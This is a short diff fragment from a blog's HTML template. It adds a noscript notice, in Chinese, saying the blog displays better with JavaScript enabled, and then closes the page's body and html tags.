+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
 </html>
